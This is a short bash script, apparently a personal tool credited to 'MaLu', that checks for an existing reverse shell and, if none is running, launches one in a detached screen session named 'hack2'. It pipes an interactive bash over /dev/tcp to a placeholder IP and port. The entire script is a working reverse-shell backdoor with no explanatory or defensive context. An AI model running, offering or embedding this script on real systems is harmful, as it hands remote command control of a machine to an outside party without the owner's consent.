#!/bin/bash
# Developer: MaLu
# http://malu.me
ps -ef|grep -e 'bash -c bash -i'|grep -v grep
if [ $? -ne 0 ]; then
    echo "start process....."
else
    echo "runing....."
    exit
fi

screen -dmS hack2 bash -c "bash -i &>/dev/tcp/<IP>/<Port> 0>&1"
